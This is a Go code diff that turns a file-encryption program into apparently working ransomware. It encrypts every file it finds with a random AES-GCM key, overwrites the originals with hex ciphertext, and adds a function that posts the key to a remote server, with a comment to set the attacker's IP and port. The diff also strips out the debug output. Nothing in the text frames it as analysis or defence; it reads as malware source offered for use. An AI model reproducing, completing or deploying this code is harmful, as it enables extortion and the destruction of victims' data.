@@ -6,24 +6,28 @@ import (
 	"crypto/rand"
 	"encoding/hex"
 	"fileutils"
-	"fmt"
 	"io"
 	"io/ioutil"
+	"net/http"
+	"net/url"
 )
 
+// Encrypt main function
 func main() {
 	bytes := make([]byte, 32)
 	if _, err := rand.Read(bytes); err != nil {
 		panic(err.Error())
 	}
 
+	key := hex.EncodeToString(bytes)
+	// We have to send the key to the server
+	sendKeyToServer(key)
+
 	for _, file := range fileutils.GetAllFiles() {
 		plaintext, err := ioutil.ReadFile(file)
 		if err != nil {
 			panic(err.Error())
 		}
-
-		fmt.Println("plaintext: ", string(plaintext))
 
 		block, err := aes.NewCipher(bytes)
 		if err != nil {
@@ -42,13 +46,25 @@ func main() {
 
 		ciphertext := aesGCM.Seal(nonce, nonce, plaintext, nil)
 
-		fmt.Println("crypted hex: ", hex.EncodeToString(ciphertext))
-
-		err2 := ioutil.WriteFile(file, ciphertext, 0644)
+		err2 := ioutil.WriteFile(file, []byte(hex.EncodeToString(ciphertext)), 0644)
 
 		if err2 != nil {
 			panic(err.Error())
 		}
 	}
 
+}
+
+func sendKeyToServer(key string) {
+
+	// change the url to your ip address and port
+	URL := "http://localhost:8080/"
+
+	resp, err := http.PostForm(URL, url.Values{"key": {key}})
+
+	if err != nil {
+		panic(err.Error())
+	}
+
+	defer resp.Body.Close()
 }
